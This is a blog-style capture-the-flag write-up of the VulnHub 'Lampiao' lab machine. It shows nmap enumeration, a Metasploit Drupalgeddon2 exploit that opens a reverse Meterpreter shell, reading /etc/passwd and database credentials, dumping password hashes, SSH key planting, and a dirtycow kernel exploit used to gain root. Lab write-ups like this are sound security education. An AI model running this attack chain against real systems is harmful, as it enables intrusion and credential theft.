---
layout: writeup
type: writeup
image: images/writeups/vuln/lampiao/logo.png
title: Lampiao - Vulnhub
permalink: writeups/lampiao
# All dates must be YYYY-MM-DD format!
date: 2021-04-20
labels:
  - VulnHub
  - Drupal 7
  - MySQL
summary: Based on the Mr. Robot show, can you root this box?
---

<img class="ui image" src="{{ site.baseurl }}/images/writeups/vuln/lampiao/header.png">
<script src="https://www.tryhackme.com/badge/192700"></script>

```
MACHINE = Lampiao
OS = LINUX
DIFFICULTY = EASY
```

## Enumeration

Starting with an nmap ping sweep to find the IP of the target on my vmware network. I then ran a full scan with nmap

```shell
┌──(root💀Toyin)-[~/infosec/lab/lampiao]
└─# nmap -sn 192.168.229.1/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 19:57 WAT
Nmap scan report for Toyin (192.168.229.1)
Host is up (0.0014s latency).
Nmap scan report for 192.168.229.157
Host is up (0.0019s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 19.63 seconds

┌──(root💀Toyin)-[~/infosec/lab/lampiao]
└─# nmap -T4 -A 192.168.229.157 | tee nmap
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 19:58 WAT
Nmap scan report for 192.168.229.157
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
80/tcp open  http?
| fingerprint-strings:
|   NULL:
|     _____ _ _
|     |_|/ ___ ___ __ _ ___ _ _
|     \x20| __/ (_| __ \x20|_| |_
|     ___/ __| |___/ ___|__,_|___/__, ( )
|     |___/
|     ______ _ _ _
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=4/4%Time=606A0C59%P=x86_64-pc-linux-gnu%r(NULL,
SF:1179,"\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\|_\x20\x20\x20_\|\x20\|\x20\(\x2

---snip---

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=4/4%OT=22%CT=1%CU=33815%PV=Y%DS=2%DC=T%G=Y%TM=606A0C82
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5B4ST11
OS:NW6%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=F227%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT     ADDRESS
1   0.33 ms Toyin.mshome.net (172.17.128.1)
2   1.41 ms 192.168.229.157

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.54 seconds
```

Nmap didn't seem sure the service running on port 80 was http and using my browser and curl just gave errors. I already started running a full port scan after the initial scan I got another open port 1898 running Apache

```shell
┌──(root💀Toyin)-[~/infosec/lab/lampiao]
└─# nmap -T4 -A -p- 192.168.229.157 | tee nmap-full
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 20:00 WAT
Nmap scan report for 192.168.229.157
Host is up (0.0012s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
80/tcp   open  http?
| fingerprint-strings:
|   NULL:
|     _____ _ _
|     |_|/ ___ ___ __ _ ___ _ _
|     \x20| __/ (_| __ \x20|_| |_
|     ___/ __| |___/ ___|__,_|___/__, ( )
|     |___/
|     ______ _ _ _
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Lampi\xC3\xA3o
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=4/4%Time=606A0D03%P=x86_64-pc-linux-gnu%r(NULL,

---snip---

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=4/4%OT=22%CT=1%CU=36769%PV=Y%DS=2%DC=T%G=Y%TM=606A0D37
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS(O
OS:1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5B4ST11N
OS:W6%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R
OS:=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=E6CA%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT     ADDRESS
1   0.72 ms Toyin.mshome.net (172.17.128.1)
2   1.98 ms 192.168.229.157

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.76 seconds
```

## Exploitation

Inspecting the scan result further it showed that the web server running on port 1898 was running Drupal 7 and it had the typical robots.txt results for a drupal site.
Using searchsploit to check exploitdb for drupal 7 exploits and a potential exploit was found, drupalgeddon. There are 3 versions however using different attack vectors.

```shell
┌──(root💀Toyin)-[~/infosec/lab/lampiao]
└─# searchsploit drupal 7 drupalgeddon
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                                                                                                         | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                                                                                          | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                                                                                               | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                                                                                               | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                                                                                  | php/webapps/35150.php
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                                                                  | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                                                               | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                                                                       | php/webapps/44449.rb
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                                                                       | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                                                   | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                                                   | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                                                                          | php/webapps/44448.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Opening metasploit and searching drupalgeddon I get only version 2 and since it is an exploit that requires no authentication I decided to try it. After setting the options and running the expoit I got back a php/meterpreter/reverse_tcp shell

```shell
┌──(root💀Toyin)-[~/infosec/lab/lampiao]
└─# msfconsole

                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.0.36-dev                          ]
+ -- --=[ 2106 exploits - 1134 auxiliary - 357 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Open an interactive Ruby terminal with
irb

msf6 > spool msfconsole.log
[*] Spooling to file msfconsole.log...
msf6 > search drupalgeddon

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/drupal_drupalgeddon2

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.17.132.143   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)


msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.229.157
RHOSTS => 192.168.229.157
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 1898
RPORT => 1898
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 172.17.132.143:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Sending stage (39282 bytes) to 172.17.128.1
[*] Meterpreter session 1 opened (172.17.132.143:4444 -> 172.17.128.1:12759) at 2021-04-04 20:20:18 +0100

meterpreter > getuid
Server username: www-data (33)
```

Checking /etc/passwd I got a user named tiago. 

```shell
meterpreter > cat /etc/passwd
tiago:x:1000:1000:tiago,,,:/home/tiago:/bin/bash
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent
```

I looked into the config file for the drupal database in /var/www/html/sites/default/settings.php and found the credentials for the mysql database

```php
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'Virgulino',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

```sql
www-data@lampiao:/var/www/html/sites/default$  mysql -u drupaluser -p drupal
 mysql -u drupaluser -p drupal
Enter password: Virgulino

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 88
Server version: 5.5.50-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>  show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| drupal             |
+--------------------+
2 rows in set (0.00 sec)

mysql> use drupal;
use drupal;
Database changed
mysql> show tables;
show tables;
+-----------------------------+
| Tables_in_drupal            |
+-----------------------------+
| actions                     |

---snip---

| users                       |
| users_roles                 |
| variable                    |
| watchdog                    |
+-----------------------------+
73 rows in set (0.00 sec)

mysql> select * from users;
select * from users;
+-----+-------+---------------------------------------------------------+------------------------+-------+-----------+------------------+------------+------------+------------+--------+-------------------+----------+---------+------------------------+--------------------------+
| uid | name  | pass                                                    | mail                   | theme | signature | signature_format | created    | access     | login      | status | timezone          | language | picture | init                   | data
        |
+-----+-------+---------------------------------------------------------+------------------------+-------+-----------+------------------+------------+------------+------------+--------+-------------------+----------+---------+------------------------+--------------------------+
|   0 |       |                                                         |                        |       |           | NULL             |          0 |          0 |          0 |      0 | NULL              |          |       0 |                        | NULL
        |
|   1 | tiago | $S$DNZ5o1k/NY7SUgtJvjPqNl40kHKwn4yXy2eroEnOAlpmT0TJ9Sx8 | lampiao@lampiao.com    |       |           | filtered_html    | 1524166911 | 1524245647 | 1524245267 |      1 | America/Sao_Paulo |          |       0 | lampiao@lampiao.com    | a:1:{s:7:"overlay";i:1;} |
|   2 | Eder  | $S$Dv5orvhi7okjmViImnVPmVgfwJ2U..PNK4E9IT/k7Lqz9GZRb7tY | eder@lampiao.com       |       |           | filtered_html    | 1524241965 | 1524244079 | 1524244079 |      1 | America/Sao_Paulo |          |       0 | eder@lampiao.com       | b:0;
        |
+-----+-------+---------------------------------------------------------+------------------------+-------+-----------+------------------+------------+------------+------------+--------+-------------------+----------+---------+------------------------+--------------------------+
4 rows in set (0.00 sec)
```

I couldn't crack the hash so I tried going by password reuse and tried “Virgulino” as tiago's password and I got in.
I generated and ssh key for the user so I could get a proper shell

```shell
tiago@lampiao:~$ sshkeygen
sshkeygen
No command 'sshkeygen' found, did you mean:
 Command 'ssh-keygen' from package 'openssh-client' (main)
sshkeygen: command not found
tiago@lampiao:~$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/tiago/.ssh/id_rsa):

Created directory '/home/tiago/.ssh'.
Enter passphrase (empty for no passphrase):

Enter same passphrase again:

Your identification has been saved in /home/tiago/.ssh/id_rsa.
Your public key has been saved in /home/tiago/.ssh/id_rsa.pub.
The key fingerprint is:
21:5f:48:2c:55:35:36:84:12:a7:a3:a2:81:a0:5d:e3 tiago@lampiao
The key's randomart image is:
+--[ RSA 2048]----+
|       o+oo+*    |
|      ..o+.. o   |
|.   o ..=..      |
|oo o . + +       |
|o o E . S        |
|   o .           |
|  .              |
|                 |
|                 |
+-----------------+
tiago@lampiao:~$ cd .ssh
cd .ssh
tiago@lampiao:~/.ssh$ ls
ls
id_rsa  id_rsa.pub
tiago@lampiao:~/.ssh$ mv id_rsa.pub authorized_keys
mv id_rsa.pub authorized_keys
```

```shell
┌──(root💀Toyin)-[~/infosec/lab/lampiao]
└─# ssh -i id_rsa_tiago tiago@192.168.229.157
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Apr  4 16:53:44 BRT 2021

  System load: 0.08              Memory usage: 8%   Processes:       196
  Usage of /:  7.5% of 19.07GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Sun Mar  7 21:28:43 2021 from 192.168.211.1
tiago@lampiao:~$
```

## Priivilege Escalation

After looking for multiple misconfigurations that won't require me to perform a kernel exploit and coming up with nothing I uploaded linux-exploit-suggester.
It gave a ton a results but I just settled for dirtycow 2

I'm not the biggest fan of using kernel exploits on boxes

```shell
meterpreter > cd /tmp
meterpreter > upload /opt/linux-exploit-suggester/linux-exploit-suggester.sh
[*] uploading  : /opt/linux-exploit-suggester/linux-exploit-suggester.sh -> linux-exploit-suggester.sh
[*] Uploaded -1.00 B of 83.48 KiB (-0.0%): /opt/linux-exploit-suggester/linux-exploit-suggester.sh -> linux-exploit-suggester.sh
[*] uploaded   : /opt/linux-exploit-suggester/linux-exploit-suggester.sh -> linux-exploit-suggester.sh
meterpreter > chmod 777 linux-exploit-suggester.sh
```

```shell
tiago@lampiao:/tmp$ ./linux-exploit-suggester.sh

Available information:

Kernel version: 4.4.0
Architecture: i686
Distribution: ubuntu
Distribution version: 14.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

74 kernel space exploits
46 user space exploits

Possible Exploits:

[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,[ ubuntu=14.04 ]{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: highly probable
   Tags: [ ubuntu=14.04{kernel:4.4.0-*} ],ubuntu=16.04{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: highly probable
   Tags: [ ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic} ]
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

---snip---
```

I used wget directly on the machine to download the source code and compiled it and executed it to modify the root credentials and got root

```shell
tiago@lampiao:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
tiago@lampiao:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
---snip---
```

pwned

